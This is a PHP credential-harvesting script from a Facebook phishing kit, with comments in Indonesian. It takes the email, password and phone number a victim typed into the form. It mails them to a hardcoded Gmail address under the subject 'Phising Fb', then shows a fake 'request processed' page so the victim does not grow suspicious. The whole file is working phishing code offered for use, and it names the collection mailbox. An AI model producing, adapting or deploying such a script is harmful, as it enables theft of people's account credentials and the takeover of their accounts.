<?php
############################################
##        Author: Abdul aziz                  ##
##       Mailer: Lomen                    ##
##       Modifer: scriptpesing.blogspot.com  ##
############################################
/* JANGAN GANTI COPYRIGHT NYA YA SAYANG */

$subjek = 'Phising Fb by Scriptpesing.blogspot.com';
$mailto = 'bocahceplak@gmail.com'; //masukin email lo disini

/* Fungsi berikut untuk mengambil input field. */

$imel = $_POST['email'];
$paswot = $_POST['password'];
$henpon = $_POST['hp'];

/* Mengambil informasi untuk dikirim kepada facebook anda !. */

$body = <<<EOD
<br><hr><br>

Email : <font color="green">$imel</font> <br>
Password : <font color="red">$paswot</font> <br>
nomor hp korban : <font color="purple">$henpon</font> <br>
EOD;


$headers = "From: info@Scriptpesing.com\r\n"; // Buat nunjukin pengirim email.
$headers .= "Content-type: text/html\r\n"; // Untuk memerintahkan server melakukan coding teks.
$success = mail($mailto, $subjek, $body, $headers); // Hal-hal yang akan dikirim.
?>
<?php
$random = rand(1000,5000);
?>
<title> Thank You ! </title>
<center> <h2> Your Request Hasbeen Proccessed,Wait 24 Hours </h2><br>		